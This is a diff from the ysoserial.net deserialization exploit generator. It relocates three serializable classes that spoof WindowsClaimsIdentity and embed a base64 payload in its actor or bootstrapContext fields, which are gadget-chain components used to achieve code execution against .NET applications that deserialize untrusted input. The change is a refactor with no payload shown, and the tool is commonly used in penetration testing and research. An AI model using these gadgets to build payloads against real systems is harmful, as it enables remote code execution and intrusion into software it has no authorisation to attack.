@@ -48,76 +48,6 @@ namespace ysoserial.Generators
             return new List<string> { GadgetTypes.BridgeAndDerived , "Not in GAC"};
         }
 
-        [Serializable]
-        public class WindowsClaimsIdentityMarshal_var1 : ISerializable
-        {
-            public WindowsClaimsIdentityMarshal_var1()
-            {
-                B64Payload = "";
-            }
-
-            public WindowsClaimsIdentityMarshal_var1(string b64payload)
-            {
-                B64Payload = b64payload;
-            }
-
-            private string B64Payload { get; }
-
-            public void GetObjectData(SerializationInfo info, StreamingContext context)
-            {
-                info.SetType(typeof(WindowsClaimsIdentity));
-                info.AddValue("_actor", B64Payload);
-                info.AddValue("m_userToken", new IntPtr(0));
-                info.AddValue("_label", null);
-                info.AddValue("_nameClaimType", null);
-                info.AddValue("_roleClaimType", null);
-            }
-        }
-
-        [Serializable]
-        public class WindowsClaimsIdentityMarshal_var2 : ISerializable
-        {
-            public WindowsClaimsIdentityMarshal_var2()
-            {
-                B64Payload = "";
-            }
-
-            public WindowsClaimsIdentityMarshal_var2(string b64payload)
-            {
-                B64Payload = b64payload;
-            }
-
-            private string B64Payload { get; }
-
-            public void GetObjectData(SerializationInfo info, StreamingContext context)
-            {
-                info.SetType(typeof(WindowsClaimsIdentity));
-                info.AddValue("System.Security.ClaimsIdentity.actor", B64Payload);
-            }
-        }
-
-        [Serializable]
-        public class WindowsClaimsIdentityMarshal_var3 : ISerializable
-        {
-            public WindowsClaimsIdentityMarshal_var3()
-            {
-                B64Payload = "";
-            }
-
-            public WindowsClaimsIdentityMarshal_var3(string b64payload)
-            {
-                B64Payload = b64payload;
-            }
-
-            private string B64Payload { get; }
-
-            public void GetObjectData(SerializationInfo info, StreamingContext context)
-            {
-                info.SetType(typeof(WindowsClaimsIdentity));
-                info.AddValue("System.Security.ClaimsIdentity.bootstrapContext", B64Payload);
-            }
-        }
-
         public override object Generate(string formatter, InputArgs inputArgs)
         {
             Generator generator = new TextFormattingRunPropertiesGenerator();
@@ -361,4 +291,75 @@ namespace ysoserial.Generators
             }
         }
     }
+
+    [Serializable]
+    public class WindowsClaimsIdentityMarshal_var1 : ISerializable
+    {
+        public WindowsClaimsIdentityMarshal_var1()
+        {
+            B64Payload = "";
+        }
+
+        public WindowsClaimsIdentityMarshal_var1(string b64payload)
+        {
+            B64Payload = b64payload;
+        }
+
+        private string B64Payload { get; }
+
+        public void GetObjectData(SerializationInfo info, StreamingContext context)
+        {
+            info.SetType(typeof(WindowsClaimsIdentity));
+            info.AddValue("_actor", B64Payload);
+            info.AddValue("m_userToken", new IntPtr(0));
+            info.AddValue("_label", null);
+            info.AddValue("_nameClaimType", null);
+            info.AddValue("_roleClaimType", null);
+        }
+    }
+
+    [Serializable]
+    public class WindowsClaimsIdentityMarshal_var2 : ISerializable
+    {
+        public WindowsClaimsIdentityMarshal_var2()
+        {
+            B64Payload = "";
+        }
+
+        public WindowsClaimsIdentityMarshal_var2(string b64payload)
+        {
+            B64Payload = b64payload;
+        }
+
+        private string B64Payload { get; }
+
+        public void GetObjectData(SerializationInfo info, StreamingContext context)
+        {
+            info.SetType(typeof(WindowsClaimsIdentity));
+            info.AddValue("System.Security.ClaimsIdentity.actor", B64Payload);
+        }
+    }
+
+    [Serializable]
+    public class WindowsClaimsIdentityMarshal_var3 : ISerializable
+    {
+        public WindowsClaimsIdentityMarshal_var3()
+        {
+            B64Payload = "";
+        }
+
+        public WindowsClaimsIdentityMarshal_var3(string b64payload)
+        {
+            B64Payload = b64payload;
+        }
+
+        private string B64Payload { get; }
+
+        public void GetObjectData(SerializationInfo info, StreamingContext context)
+        {
+            info.SetType(typeof(WindowsClaimsIdentity));
+            info.AddValue("System.Security.ClaimsIdentity.bootstrapContext", B64Payload);
+        }
+    }
+
 }
